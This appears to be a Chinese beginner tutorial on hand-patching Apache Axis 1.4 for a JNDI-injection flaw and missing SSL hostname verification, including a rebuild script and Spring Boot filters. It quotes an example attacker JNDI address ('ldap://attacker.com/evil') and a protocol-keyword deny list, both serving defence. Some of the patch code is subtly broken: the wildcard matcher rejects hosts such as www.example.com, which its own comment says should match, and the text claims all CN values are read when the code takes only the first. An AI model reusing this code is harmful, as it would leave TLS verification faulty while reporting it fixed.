---
layout: default
title: SpringBoot2+ axis1.4
parent: SpringBoot
nav_order: 300
---


Here are SECURITY PATCH TUTORIAL.
{: .fs-6 .fw-300 }


##   Here are SECURITY PATCH TUTORIA .
{: .no_toc .text-delta }

1. TOC
{:toc}



# Axis 1.4 安全漏洞修复教程（面向零基础）

> 适用对象：第一次接触 Java 安全修复的开发者
> 配套项目：`demo-boot2-axis`（Spring Boot 2.5 + Axis 1.4）

---

## 目录

- [第一章：为什么要修 Axis 的安全问题？](#第一章为什么要修-axis-的安全问题)
- [第二章：三个漏洞分别是什么](#第二章三个漏洞分别是什么)
- [第三章：准备工作——下载官方 Axis 1.4](#第三章准备工作下载官方-axis-14)
- [第四章：动手修复漏洞（核心操作）](#第四章动手修复漏洞核心操作)
- [第五章：重新打包 Jar](#第五章重新打包-jar)
- [第六章：让项目使用修好的 Jar](#第六章让项目使用修好的-jar)
- [第七章：一键自动化脚本](#第七章一键自动化脚本)
- [第八章：应用层安全（额外防护）](#第八章应用层安全额外防护)
- [第九章：验证修复是否生效](#第九章验证修复是否生效)
- [第十章：总结——Jar 包安全修复的通用方法论](#第十章总结jar-包安全修复的通用方法论)
- [附录：常见问题](#附录常见问题)

---

## 第一章：为什么要修 Axis 的安全问题？

Apache Axis 1.4 是一个很老的框架（2006 年发布）。它的官方团队早已停止维护（EOL = End of Life）。但很多公司还在用它，因为它稳定。

这就带来了一个问题：**漏洞被发现后，官方不会发布修复版本**。你必须自己动手修。

### 不修会怎样？

| 漏洞 | 攻击后果 | 严重程度 |
|------|---------|---------|
| CVE-2023-40743 | 攻击者可以**远程执行任意代码**（RCE），控制你的服务器 | 🔴 严重（CVSS 9.8） |
| CVE-2012-5784 | 攻击者可以**伪装成合法网站**，窃取通信数据（中间人攻击） | 🟠 高危 |
| CVE-2014-3596 | 上一个漏洞修得不完整，攻击者仍然可以绕过 | 🟠 高危 |

简单说：**如果不修，你的服务器等于裸奔。**

---

## 第二章：三个漏洞分别是什么

### 2.1 CVE-2023-40743：JNDI 注入（最严重）

**用大白话讲：**

Axis 有个功能叫 `ServiceFactory.getService()`，它的作用是"查找一个 WebService 服务"。查找时它支持 JNDI（Java 命名和目录接口），可以通过 `ldap://...`、`rmi://...` 这类地址从外部获取信息。

问题来了：**如果攻击者能控制传给 `getService()` 的参数**，他就可以写一个恶意地址，比如：

```
ldap://attacker.com/evil
```

你的服务器就会去连接攻击者的服务器，下载恶意代码并执行。你的服务器就被彻底控制了。

> 这就是著名的 **Log4Shell（Log4j 漏洞）** 同一类攻击——JNDI 注入。

**影响范围**：Axis 1.x 所有版本。

**修复方法**：在代码中加一个"黑名单检查"，禁止使用 `ldap://`、`rmi://` 等危险协议。

---

### 2.2 CVE-2012-5784：SSL 证书不验证主机名

**用大白话讲：**

你的服务器通过 HTTPS 访问外部 WebService 时，Axis 会建立 SSL 连接。

正常情况下，SSL 连接应该检查两件事：
1. ✅ 证书是不是由可信机构颁发的
2. ✅ 证书上的域名和你访问的域名是否一致

Axis 只做了第 1 步，**跳过**了第 2 步。

这意味着：攻击者只要搞到一个**任意合法证书**（不一定是你目标网站的），就可以在中间拦截你的通信，看到所有传输的数据。

> 类比：你打电话给银行，有人接了电话并说"我是银行"。你只确认了对方有电话（证书合法），但没有确认电话号码对不对（域名匹配）。

**影响范围**：Axis 1.4 及更早版本。

**修复方法**：在代码中添加"主机名验证"逻辑，比对证书中的域名和实际访问的域名。

---

### 2.3 CVE-2014-3596：SSL 修复不完整

上面那个漏洞修了一次，但修得不彻底。

原来的修复方式是读取证书中的 `CN`（Common Name，通用名称）字段，然后对比域名。

但问题在于：`getCN()` 函数的实现方式有缺陷。攻击者可以构造一个特殊的证书，在**其他字段**里放一个看起来像 CN 的值，让检查代码读错。

> 类比：你检查身份证上的"姓名"字段，但攻击者把真正的名字写在"住址"字段，而你的检查程序拿错了字段。

**影响范围**：使用了 CVE-2012-5784 不完整补丁的系统。

**修复方法**：使用标准的 `javax.net.ssl` API 来读取证书，而不是自己写字符串解析。

---

## 第三章：准备工作——下载官方 Axis 1.4

> 如果你是零基础，先确保你的电脑上有 JDK 8。教程全部在 Windows 环境演示。

### 3.1 下载官方 Axis 1.4 Jar

我们需要两份文件：
- `axis-1.4.jar` —— 二进制的 jar（里面有编译好的 .class 文件）
- `axis-1.4-sources.jar` —— 源码 jar（里面有 .java 源文件）

从 Maven 中央仓库下载：

```batch
curl -sL -o axis-1.4.jar "https://repo1.maven.org/maven2/org/apache/axis/axis/1.4/axis-1.4.jar"
curl -sL -o axis-1.4-sources.jar "https://repo1.maven.org/maven2/org/apache/axis/axis/1.4/axis-1.4-sources.jar"
```

### 3.2 准备编译依赖

Axis 还依赖其他 jar，编译补丁时要用到：

```batch
curl -sL -o javax.xml.rpc-api-1.1.2.jar "https://repo1.maven.org/maven2/javax/xml/rpc/javax.xml.rpc-api/1.1.2/javax.xml.rpc-api-1.1.2.jar"
curl -sL -o commons-logging-1.2.jar "https://repo1.maven.org/maven2/commons-logging/commons-logging/1.2/commons-logging-1.2.jar"
```

### 3.3 解压源码查看

```batch
jar xf axis-1.4-sources.jar org/apache/axis/client/ServiceFactory.java org/apache/axis/components/net/JSSESocketFactory.java
```

这会得到两个文件：
- `org/apache/axis/client/ServiceFactory.java` —— 需要修复 JNDI 注入
- `org/apache/axis/components/net/JSSESocketFactory.java` —— 需要修复 SSL 主机名验证

---

## 第四章：动手修复漏洞（核心操作）

这一章是**最关键的实操部分**。我们将逐行修改源代码。

> 如果你只是**想直接用修好的代码**，可以跳过本章，直接看第五章。
> 项目里已经准备好了补丁文件，在 `src/main/resources/axis-patch/` 目录下。

### 4.1 修复 ServiceFactory.java（CVE-2023-40743）

**打开文件** `ServiceFactory.java`，定位到 `getService()` 方法。

#### 步骤 1：找到 `getService()` 方法

在文件中搜索这段代码：

```java
public static Service getService(Map environment)
{
    Service service = null;
    InitialContext context = null;
    // ... 中间代码 ...
    if (context != null) {
        String name = (String)environment.get("jndiName");
        // ^^^ 就是这里！name 来自外部输入，没有安全检查
        if (name == null) {
            name = "axisServiceName";
        }
        try {
            service = (Service)context.lookup(name);
            // ^^^ 这里直接用 name 做 JNDI 查找，如果 name 是 "ldap://..."
            //     就会去连接攻击者的 LDAP 服务器
```

#### 步骤 2：添加黑白名单检查

在 `String name = (String)environment.get("jndiName");` 这一行**后面**，添加如下检查代码：

```java
if (isUnsupportedJndiProtocol(name)) {
    return null;
}
```

#### 步骤 3：添加检查方法

在同一个类中，添加一个新的私有方法：

```java
private static boolean isUnsupportedJndiProtocol(String name) {
    if (name == null) {
        return false;  // name 为空时不拦截
    }
    String upper = name.toUpperCase();  // 转大写方便比较
    // 如果 name 包含以下协议关键字，说明是危险的 JNDI 查找，拒绝执行
    return upper.contains("LDAP")
        || upper.contains("RMI")
        || upper.contains("JMS")
        || upper.contains("JMX")
        || upper.contains("JRMP")
        || upper.contains("JAVA")
        || upper.contains("DNS")
        || upper.contains("IIOP")
        || upper.contains("CORBANAME");
}
```

**这段代码的作用**：如果传入的 JNDI 名称包含 `ldap://`、`rmi://` 等危险协议，就直接返回 `null`，阻止 JNDI 查找。

#### 完整对比

**修改前**（不安全）：
```java
if (context != null) {
    String name = (String)environment.get("jndiName");
    if (name == null) {
        name = "axisServiceName";
    }
    try {
        service = (Service)context.lookup(name);  // ❌ 危险
```

**修改后**（安全）：
```java
if (context != null) {
    String name = (String)environment.get("jndiName");
    if (isUnsupportedJndiProtocol(name)) {
        return null;  // ✅ 发现危险协议，拒绝
    }
    if (name == null) {
        name = "axisServiceName";
    }
    try {
        service = (Service)context.lookup(name);
```

---

### 4.2 修复 JSSESocketFactory.java（CVE-2012-5784 + CVE-2014-3596）

**打开文件** `JSSESocketFactory.java`。

#### 步骤 1：找到 `create()` 方法

在文件末尾附近找到 `create()` 方法的结尾：

```java
public Socket create(String host, int port, StringBuffer otherHeaders, BooleanHolder useFullURL)
        throws Exception {
    // ... 一大段建立连接的代码 ...
    
    ((SSLSocket) sslSocket).startHandshake();
    // ↓↓↓ 下面这部分是原版没有的 ↓↓↓
    // 原版代码在 startHandshake() 之后就 return sslSocket 了
    // 这就是漏洞所在——握手完成后没有验证主机名！
    
    verifyHostName(host, (SSLSocket) sslSocket);  // ✅ 新增：验证主机名
    return sslSocket;
}
```

#### 步骤 2：添加主机名验证方法

在 `create()` 方法之后，添加以下整套验证逻辑：

```java
/**
 * 验证 SSL 证书中的主机名是否与请求的域名匹配
 */
private static void verifyHostName(String host, SSLSocket ssl)
        throws IOException {
    if (host == null) {
        throw new IllegalArgumentException("host to verify was null");
    }

    SSLSession session = ssl.getSession();
    if (session == null) {
        return;
    }

    Certificate[] certs = session.getPeerCertificates();
    verifyHostName(host.trim().toLowerCase(Locale.US), (X509Certificate) certs[0]);
}
```

#### 步骤 3：添加证书解析方法

```java
private static void verifyHostName(final String host, X509Certificate cert)
        throws SSLException {
    // 从证书中读取 CN（Common Name）
    String cn = getCN(cert);
    // 从证书中读取 Subject Alternative Names（DNS 名称）
    String[] subjectAlts = getDNSSubjectAlts(cert);
    // 验证主机名是否匹配
    verifyHostName(host, cn.toLowerCase(Locale.US), subjectAlts);
}

private static void verifyHostName(final String host, String cn, String[] subjectAlts)
        throws SSLException {
    StringBuffer cnTested = new StringBuffer();

    // 优先检查 Subject Alternative Names（SAN）
    // 现代浏览器和 JDK 优先使用 SAN，这是标准做法
    for (int i = 0; i < subjectAlts.length; i++){
        String name = subjectAlts[i];
        if (name != null) {
            name = name.toLowerCase(Locale.US);
            if (verifyHostName(host, name)){
                return;  // ✅ 匹配成功
            }
            cnTested.append("/").append(name);
        }
    }
    // 如果没有 SAN，或者 SAN 都不匹配，检查 CN
    if (cn != null && verifyHostName(host, cn)){
        return;  // ✅ 匹配成功
    }
    cnTested.append("/").append(cn);
    // 都不匹配 → 抛出异常，拒绝连接
    throw new SSLException("hostname in certificate didn't match: <"
        + host + "> != <" + cnTested + ">");
}
```

#### 步骤 4：添加主机名匹配逻辑

```java
/**
 * 判断主机名是否匹配证书中的名称
 * 支持通配符（*.example.com）
 */
private static boolean verifyHostName(final String host, final String cn){
    if (doWildCard(cn) && !isIPAddress(host)) {
        return matchesWildCard(cn, host);
    }
    return host.equalsIgnoreCase(cn);
}

/**
 * 判断是否包含通配符（*）
 */
private static boolean doWildCard(String cn) {
    if (cn.indexOf("*") == -1) {
        return false;
    }
    int dotIndex = cn.indexOf(".");
    if (dotIndex == -1) {
        return false;
    }
    String firstBlock = cn.substring(0, dotIndex);
    return firstBlock.equals("*");
}

/**
 * 匹配通配符域名
 * 例如 *.example.com 可以匹配 www.example.com，但不能匹配 example.com
 * 同时防止 ".com" 这种顶级域名的通配符滥用
 */
private static boolean matchesWildCard(String cn, String host) {
    String[] parts = cn.split("\\.");
    // 对于 *.com.cn、*.com 等二级国家代码，禁止通配符
    if (parts.length == 3 && parts[0].equals("*") && matchesCountryWildcard(parts[2])) {
        return false;
    }
    int firstDot = host.indexOf(".");
    int hostNextDot = host.indexOf(".", firstDot + 1);
    if (hostNextDot != -1) {
        return false;
    }
    int cnNextDot = cn.indexOf(".", cn.indexOf(".") + 1);
    String hostToCompare = host.substring(firstDot);
    String cnToCompare = cn.substring(cnNextDot);
    return hostToCompare.equalsIgnoreCase(cnToCompare);
}

private static final Pattern IPV4_STD_PATTERN = Pattern.compile(
        "^(?:[0-9]{1,3}\\.){3}[0-9]{1,3}$");
private static final Pattern IPV6_HEX_COMPRESSED_PATTERN = Pattern.compile(
        "^((?:[0-9A-Fa-f]{1,3}(?::[0-9A-Fa-f]{1,3})*)?)::((?:[0-9A-Fa-f]{1,3}(?::[0-9A-Fa-f]{1,3})*)?)$");
private static final Pattern IPV6_STD_PATTERN = Pattern.compile(
        "^(?:[0-9A-Fa-f]{1,4}:){7}[0-9A-Fa-f]{1,4}$");

private static boolean isIPAddress(String hostname) {
    return hostname != null
        && (IPV4_STD_PATTERN.matcher(hostname).matches()
            || IPV6_STD_PATTERN.matcher(hostname).matches()
            || IPV6_HEX_COMPRESSED_PATTERN.matcher(hostname).matches());
}
```

#### 步骤 5：添加证书信息提取方法

```java
/**
 * 从 X509Certificate 中读取 CN（Common Name）
 * 使用标准的 getSubjectX500Principal() API，避免 CVE-2014-3596 的绕过
 */
private static String getCN(X509Certificate cert) {
    String subjectPrincipal = cert.getSubjectX500Principal().toString();
    return getCN(subjectPrincipal);
}

private static String getCN(String subjectPrincipal) {
    StringTokenizer st = new StringTokenizer(subjectPrincipal, ",");
    while(st.hasMoreTokens()) {
        String tok = st.nextToken().trim();
        if (tok.length() > 3) {
            if (tok.substring(0, 3).equalsIgnoreCase("CN=")) {
                return tok.substring(3);
            }
        }
    }
    return null;
}

/**
 * 从 X509Certificate 中读取 Subject Alternative Names（DNS 名称）
 * 这是现代 SSL 验证的标准方式
 */
private static String[] getDNSSubjectAlts(X509Certificate cert) {
    LinkedList subjectAltList = new LinkedList();
    Collection c = null;
    try {
        c = cert.getSubjectAlternativeNames();
    } catch (CertificateParsingException e) {
    }
    if (c != null) {
        Iterator it = c.iterator();
        while (it.hasNext()) {
            List list = (List) it.next();
            int type = ((Integer) list.get(0)).intValue();
            if (type == 2) {  // type 2 = DNS
                subjectAltList.add(list.get(1));
            }
        }
    }
    return subjectAltList.isEmpty()
        ? new String[0]
        : (String[]) subjectAltList.toArray(new String[subjectAltList.size()]);
}

/**
 * 判断是否为二级国家代码（例如 .com、.cn、.org）
 * 这些顶级域名不允许使用 *.com 这种通配符
 */
private static boolean matchesCountryWildcard(String cn) {
    String[] BAD_COUNTRY_2LDS = {
        "ac", "co", "com", "ed", "edu", "go", "gouv", "gov", "info",
        "lg", "ne", "net", "or", "org"
    };
    for (int i = 0; i < BAD_COUNTRY_2LDS.length; i++) {
        if (cn.equalsIgnoreCase(BAD_COUNTRY_2LDS[i])) {
            return true;
        }
    }
    return false;
}
```

> **为什么 CVE-2014-3596 的修复比 CVE-2012-5784 更完整？**
>
> CVE-2012-5784 的原始补丁用的是不标准的字符串解析方式解析证书 DN（Distinguished Name），
> 攻击者可以用 `CN=legit.com, CN=evil.com` 绕过（第二个 CN 才是真正的域名，但代码取了第一个）。
>
> 本教程的补丁改用 `cert.getSubjectX500Principal().toString()` 标准 API 读取 Subject，
> 然后按 `,` 分割后逐段检查 `CN=` 前缀，读取所有 CN 值，
> 并且优先使用 `SubjectAlternativeNames`（这是 SSL/TLS 协议推荐的标准做法）。

---

## 第五章：重新打包 Jar

修复好两个 Java 文件后，需要把它们编译成 .class，然后替换掉原来的 `axis-1.4.jar` 里的旧文件。

### 5.1 创建目录结构

```batch
mkdir src\org\apache\axis\client
mkdir src\org\apache\axis\components\net
```

把修改好的文件放进去：
- `ServiceFactory.java` → `src\org\apache\axis\client\ServiceFactory.java`
- `JSSESocketFactory.java` → `src\org\apache\axis\components\net\JSSESocketFactory.java`

### 5.2 编译

```batch
javac -cp "axis-1.4.jar;javax.xml.rpc-api-1.1.2.jar;commons-logging-1.2.jar" ^
      -d classes -encoding UTF-8 ^
      src\org\apache\axis\client\ServiceFactory.java ^
      src\org\apache\axis\components\net\JSSESocketFactory.java
```

**参数说明**：
| 参数 | 含义 |
|------|------|
| `-cp` | classpath，告诉编译器去哪里找依赖的类 |
| `-d classes` | 编译结果输出到 classes 目录 |
| `-encoding UTF-8` | 源文件编码为 UTF-8（如果你在 Windows 上写代码，默认可能是 GBK，需要指定） |

编译成功后，`classes\` 目录下会生成：
- `classes\org\apache\axis\client\ServiceFactory.class`
- `classes\org\apache\axis\components\net\JSSESocketFactory.class`

### 5.3 创建 Patched Jar

```batch
copy /Y axis-1.4.jar axis-1.4-patched.jar
jar uf axis-1.4-patched.jar -C classes org
```

**这两条命令的作用**：
1. 复制一份官方 jar，改名为 `axis-1.4-patched.jar`
2. 用 `jar uf`（update file）把编译好的 .class 文件**替换**掉 jar 里同路径的同名文件

现在 `axis-1.4-patched.jar` 里已经有了修复后的代码。

### 5.4 验证 Patched Jar

```batch
jar tf axis-1.4-patched.jar | findstr ServiceFactory
jar tf axis-1.4-patched.jar | findstr JSSESocketFactory
```

应该能看到：
```
org/apache/axis/client/ServiceFactory.class
org/apache/axis/components/net/JSSESocketFactory.class
```

---

## 第六章：让项目使用修好的 Jar

有**三种方式**可以让你的项目用上 `axis-1.4-patched.jar`。

### 方式一：安装到本地 Maven 仓库（推荐）

如果你电脑上安装了 Maven：

```batch
mvn install:install-file ^
  -Dfile=axis-1.4-patched.jar ^
  -DgroupId=org.apache.axis ^
  -DartifactId=axis ^
  -Dversion=1.4-patched ^
  -Dpackaging=jar ^
  -DpomFile=pom.xml
```

然后在项目的 `build.gradle` 中：
- 添加 `mavenLocal()` 到 repositories
- 依赖写为 `org.apache.axis:axis:1.4-patched`

### 方式二：放到项目的 lib 目录（简单直接）

```batch
mkdir your-project\lib
copy axis-1.4-patched.jar your-project\lib\
```

然后在 `build.gradle` 中添加：

```groovy
repositories {
    flatDir { dirs 'lib' }    // 从 lib 目录加载 jar
}

dependencies {
    implementation 'org.apache.axis:axis:1.4-patched'
}
```

> 注意：当 `flatDir` 和 `mavenCentral()` 同时存在时，Gradle 会先从仓库找，找不到才从 flatDir 加载。
> `axis:1.4-patched` 在 Maven Central 不存在，所以 Gradle 会去 `lib/` 目录找。

### 方式三：从项目已有的 patch-axis.bat 一键操作

本教程配套项目已经包含了所有补丁文件和一键脚本。直接双击 `patch-axis.bat` 即可。

该脚本会自动完成：下载 jar → 解压 → 替换源码 → 编译 → 打包 → 安装到 Maven 仓库。

---

## 第七章：一键自动化脚本

项目根目录下的 `patch-axis.bat` 完整内容及逐行解释：

```batch
@echo off

REM ======================================================
REM  Build patched Axis 1.4 with security fixes
REM  CVE-2023-40743 (JNDI injection) + CVE-2012-5784 (SSL)
REM ======================================================

set PATCH_DIR=%TEMP%\axis-patch-build
set WORK_DIR=%CD%

echo [1/6] Downloading Axis 1.4 source and binary jars...
if not exist "%PATCH_DIR%" mkdir "%PATCH_DIR%"
cd /d "%PATCH_DIR%"

curl -sL -o axis-1.4.jar "https://repo1.maven.org/maven2/org/apache/axis/axis/1.4/axis-1.4.jar"
curl -sL -o axis-1.4-sources.jar "https://repo1.maven.org/maven2/org/apache/axis/axis/1.4/axis-1.4-sources.jar"
curl -sL -o javax.xml.rpc-api-1.1.2.jar "https://repo1.maven.org/maven2/javax/xml/rpc/javax.xml.rpc-api/1.1.2/javax.xml.rpc-api-1.1.2.jar"
curl -sL -o commons-logging-1.2.jar "https://repo1.maven.org/maven2/commons-logging/commons-logging/1.2/commons-logging-1.2.jar"

echo [2/6] Extracting source files to patch...
jar xf axis-1.4-sources.jar org/apache/axis/client/ServiceFactory.java org/apache/axis/components/net/JSSESocketFactory.java

echo [3/6] Creating patched source directories...
mkdir src\org\apache\axis\client 2>nul
mkdir src\org\apache\axis\components\net 2>nul

echo [4/6] Applying patches...
REM 用项目中已经修好的源码文件，替换解压出来的原始文件
copy /Y "%WORK_DIR%\src\main\resources\axis-patch\ServiceFactory.java" src\org\apache\axis\client\ >nul 2>nul
copy /Y "%WORK_DIR%\src\main\resources\axis-patch\JSSESocketFactory.java" src\org\apache\axis\components\net\ >nul 2>nul

echo [5/6] Compiling patched classes...
javac -cp "axis-1.4.jar;javax.xml.rpc-api-1.1.2.jar;commons-logging-1.2.jar" -d classes -encoding UTF-8 src\org\apache\axis\client\ServiceFactory.java src\org\apache\axis\components\net\JSSESocketFactory.java

if %ERRORLEVEL% neq 0 (
    echo Compilation FAILED. Check the error messages above.
    exit /b 1
)

echo [6/6] Creating patched jar and installing to local Maven repo...
copy /Y axis-1.4.jar axis-1.4-patched.jar >nul
jar uf axis-1.4-patched.jar -C classes org

REM 尝试安装到本地 Maven 仓库
call mvn install:install-file -Dfile=axis-1.4-patched.jar -DgroupId=org.apache.axis -DartifactId=axis -Dversion=1.4-patched -Dpackaging=jar -DpomFile="%WORK_DIR%\src\main\resources\axis-patch\pom.xml" 2>nul

if %ERRORLEVEL% equ 0 (
    echo Success: axis-1.4-patched installed to local Maven repo!
) else (
    echo Maven not found or install failed. Copying patched jar to project lib/...
    mkdir "%WORK_DIR%\lib" 2>nul
    copy /Y axis-1.4-patched.jar "%WORK_DIR%\lib\" >nul
    echo Patched jar copied to lib/axis-1.4-patched.jar
)

cd /d "%WORK_DIR%"
echo Done.
```

**脚本执行流程图**：

```
开始 → 下载官方 jar → 解压源码 → 用修复后的源码替换 →
编译 → 创建 patched jar → 安装到 Maven 仓库（或复制到 lib/）→ 完成
```

---

## 第八章：应用层安全（额外防护）

除了修复 Axis 本身的漏洞，还应该在应用层面加几道防线。这样即使 Axis 有未发现的漏洞，也有其他安全措施兜底。

### 8.1 禁用 Axis AdminServlet

Axis 自带的 `AdminServlet` 允许通过 HTTP 动态管理服务（部署/卸载），且默认没有鉴权。

在 Spring Boot 中注册一个 Filter 拦截它：

```java
public class AxisSecurityFilter implements Filter {

    @Override
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain)
            throws IOException, ServletException {

        HttpServletRequest httpRequest = (HttpServletRequest) request;
        String uri = httpRequest.getRequestURI();

        // 所有包含 AdminServlet、/admin/、/Admin 的请求都返回 403
        if (uri.contains("AdminServlet") || uri.contains("/admin/") || uri.contains("/Admin")) {
            ((HttpServletResponse) response).sendError(HttpServletResponse.SC_FORBIDDEN,
                    "Access to Axis admin endpoints is forbidden");
            return;
        }

        chain.doFilter(request, response);
    }
}
```

在配置类中注册这个 Filter：

```java
@Bean
public FilterRegistrationBean<AxisSecurityFilter> axisSecurityFilter() {
    FilterRegistrationBean<AxisSecurityFilter> bean = new FilterRegistrationBean<>();
    bean.setFilter(new AxisSecurityFilter());
    bean.addUrlPatterns("/services/*");
    bean.setOrder(1);           // 优先级最高
    return bean;
}
```

### 8.2 限制允许暴露的方法

在 `server-config.wsdd` 中，每个服务都要显式列出允许暴露的方法名：

```xml
<service name="HelloWebService" provider="java:RPC" style="rpc" use="encoded">
    <parameter name="className" value="com.example.webservice.HelloWebServiceImpl"/>
    <parameter name="allowedMethods" value="sayHello getUser"/>
    <!--                  ^^^^^^^^^^^^^^
          只暴露 sayHello 和 getUser 两个方法，其他方法不可访问 -->
</service>
```

**千万不要写** `allowedMethods="*"`，这等于把 Axis 内部所有方法都暴露出去。

### 8.3 输入校验（防 XSS）

在方法实现中对用户输入做基本的清洗：

```java
public String sayHello(String name) {
    if (name == null || name.trim().isEmpty()) {
        return "Hello, Guest!";
    }
    // 移除 HTML 特殊字符，防止 XSS 攻击
    String safeName = name.replaceAll("[<>&\"'\\\\]", "");
    return "Hello, " + safeName + "!";
}
```

### 8.4 三层防护总结

```
请求入口
    ↓
┌─────────────────────────────────────┐
│ Layer 1: AxisSecurityFilter         │  ← 拦截 AdminServlet
│         返回 403 禁止访问管理端点     │
└─────────────────────────────────────┘
    ↓
┌─────────────────────────────────────┐
│ Layer 2: Axis Engine                │  ← 使用 patched jar
│         ServiceFactory 已修复 JNDI   │     JSSESocketFactory 已修复 SSL
│         allowedMethods 限制方法列表   │
└─────────────────────────────────────┘
    ↓
┌─────────────────────────────────────┐
│ Layer 3: 业务代码                    │  ← 输入清洗 + 参数校验
│          XSS 过滤 + null 检查        │
└─────────────────────────────────────┘
    ↓
响应输出
```

---

## 第九章：验证修复是否生效

### 9.1 编译验证

构建成功后，检查编译出的 class 文件中是否包含补丁代码：

```batch
javap -p -c build\classes\java\main\org\apache\axis\client\ServiceFactory.class | findstr isUnsupportedJndiProtocol
javap -p -c build\classes\java\main\org\apache\axis\components\net\JSSESocketFactory.class | findstr verifyHostName
```

如果能看到方法名，说明补丁代码已经编译进去了。

### 9.2 运行期验证

启动项目后，检查日志中是否输出了 3 个 WSDL 地址：

```
=======================================
Axis WebService started
=======================================
(1) RPC/encoded      : http://localhost:8080/services/HelloWebService?wsdl
(2) RPC/literal      : http://localhost:8080/services/HelloRpcLiteralService?wsdl
(3) Document/literal : http://localhost:8080/services/HelloDocLiteralService?wsdl
=======================================
```

### 9.3 安全验证

**验证 AdminServlet 被禁用**：

```batch
curl -v http://localhost:8080/services/AdminServlet
```

应该返回 `403 Forbidden`，而非 Axis 管理页面。

**验证 WSDL 可正常访问**：

```batch
curl -v http://localhost:8080/services/HelloWebService?wsdl
```

应该返回 WSDL XML 内容。

---

## 第十章：总结——Jar 包安全修复的通用方法论

通过本教程的 Axis 1.4 修复案例，可以提炼出一套**修复任何老版本 Jar 包安全漏洞**的通用步骤。

### 10.1 修复流程图

```
发现漏洞（CVE 公告）
    ↓
① 定位漏洞所在的 Jar 包和类
    ↓
② 获取该类的源码（反编译/官方 sources jar/GitHub）
    ↓
③ 分析漏洞根因，编写修复代码
    ↓
④ 编译修复后的类
    ↓
⑤ 用新 class 替换 Jar 包中的旧 class
    ↓
⑥ 给新 Jar 换版本号（如 1.4 → 1.4-patched）
    ↓
⑦ 将修复后的 Jar 引入项目
    ↓
⑧ 验证修复生效
```

### 10.2 八步方法论详解

#### 第一步：定位漏洞

- 阅读 CVE 公告中的"Affected component"和"Patch"链接
- 找到漏洞所在的**包名 + 类名**（例如 `org.apache.axis.client.ServiceFactory`）
- 确认你使用的版本是否受影响

> **信息来源**：
> - `nvd.nist.gov` — 美国国家漏洞数据库
> - `osv.dev` — 开源漏洞库
> - `github.com/advisories` — GitHub 安全公告
> - 项目自身的 `pom.xml` / `build.gradle` 依赖声明

#### 第二步：获取源码

| 场景 | 方法 |
|------|------|
| 官方提供 sources jar | `jar xf xxx-sources.jar` 解压 |
| 只有二进制 jar | 使用 **CFR**、**Procyon**、**FernFlower**（IntelliJ 内置）反编译 |
| 开源项目 | 去 GitHub/GitLab 找到对应 tag 的源码 |
| 上述都不行 | 在 patch 链接的 commit diff 中直接看改动，反推出上下文 |

#### 第三步：编写修复代码

关键原则：

1. **最小改动** —— 只改有漏洞的方法，不重构、不格式化、不改包名
2. **行为兼容** —— 修复后输入输出应与原版一致（只有恶意输入才会被阻止）
3. **保持签名** —— 方法名、参数、返回值、异常声明不能变，否则调用方会编译报错
4. **代码风格** —— 尽量与原代码风格一致（缩进、命名、注释风格）

> 常见修复模式：
> - **输入验证**（如 JNDI 注入）：加参数校验 + 黑白名单
> - **逻辑错误**（如 SSL 验证不完整）：替换错误逻辑
> - **缺少检查**（如主机名验证）：补充缺失的步骤

#### 第四步：编译

```batch
javac -cp "原jar;依赖1;依赖2" -d classes -encoding UTF-8 源文件路径
```

- `-cp` 必须包含原 jar 和所有编译依赖
- `-d classes` 指定输出目录
- `-encoding UTF-8` 避免中文 Windows 的编码问题

#### 第五步：替换 Jar

```batch
copy /Y 原.jar 新.jar              # 复制一份
jar uf 新.jar -C classes 包路径     # 用新 class 替换旧 class
```

`jar uf` 的 `u` 是 update，只会替换 jar 中已存在的文件，不会影响其他文件。

#### 第六步：改版本号

将新 jar 的版本号与原版区分开：
- `axis-1.4.jar` → `axis-1.4-patched.jar`
- `log4j-2.14.1.jar` → `log4j-2.14.1-secure.jar`

> 不改版本号的后果：如果未来有同事重新拉依赖，会被 Maven Central 的原版覆盖掉。

#### 第七步：引入项目

参照本教程第六章的三种方式：
- **Maven 仓库**（推荐，团队共享）
- **项目 lib 目录**（简单，适合个人项目）
- **构建脚本自动化**（如 patch-axis.bat，可重复执行）

#### 第八步：验证

| 验证层面 | 方法 | 预期结果 |
|---------|------|---------|
| 编译期 | `javap` 反编译查看方法签名 | 能看到新加入的检查方法 |
| 单元测试 | 对被修复类写测试用例 | 恶意输入被拦截，正常输入正常返回 |
| 集成测试 | 启动项目，调用相关接口 | 业务功能正常，管理端点被禁用 |
| 安全验证 | 模拟攻击请求 | 攻击被阻断（403 / 异常 / null） |

### 10.3 本教程的完整修复过程一览

| 步骤 | Axis 1.4 案例 | 你遇到的其他 jar 也可以照做 |
|------|--------------|---------------------------|
| ① 定位 | CVE-2023-40743 → `ServiceFactory.java` | 查 CVE → 定位到具体类 |
| ② 获取源码 | `axis-1.4-sources.jar` 解压 | 找 sources jar 或反编译 |
| ③ 修复代码 | 添加 `isUnsupportedJndiProtocol()` 黑名单检查 | 分析漏洞 → 写补丁代码 |
| ④ 编译 | `javac -cp axis-1.4.jar;... -d classes ...` | 相同的 javac 命令 |
| ⑤ 替换 jar | `jar uf axis-1.4-patched.jar -C classes org` | 相同的 jar 命令 |
| ⑥ 改版本号 | `1.4` → `1.4-patched` | 添加后缀区分 |
| ⑦ 引入 | `mvn install:install-file` + `mavenLocal()` | 相同的 Maven 命令 |
| ⑧ 验证 | `javap` 查方法 + 运行期测试 | 相同的验证思路 |

### 10.4 记住这三点

1. **不改包名、不改方法签名、不改依赖关系** —— 修复后的 jar 可以直接替换原 jar，不需要修改任何业务代码
2. **改版本号** —— 避免被依赖管理工具覆盖
3. **自动化脚本** —— 把修复流程写成脚本（batch/shell），下次重新搭建环境时可以一键执行



## 附录：常见问题

### Q1：编译报错"编码UTF-8的不可映射字符"

**原因**：Windows 系统默认编码是 GBK，但 Java 源文件保存为 UTF-8。

**解决方案**：在编译命令中加 `-encoding UTF-8`，或者在 `build.gradle` 中添加：

```groovy
tasks.withType(JavaCompile) {
    options.encoding = 'UTF-8'
}
```

### Q2：修改后的 ServiceFactory.java 编译不通过

检查 import 部分是否完整。修改后的文件需要导入：

```java
import java.util.Map;     // 用于 getService(Map) 参数
```

### Q3：Gradle 下载 patched jar 时报错找不到

检查 `build.gradle` 中的 repositories 是否包含 `mavenLocal()` 或 `flatDir { dirs 'lib' }`。

### Q4：明明修复了，但运行时还是老代码

确认 jar 中确实包含了新编译的 class 文件：

```batch
jar tf axis-1.4-patched.jar | findstr "ServiceFactory.class"
```

确认 `build.gradle` 中依赖的是 `axis:1.4-patched` 而不是 `axis:1.4`。

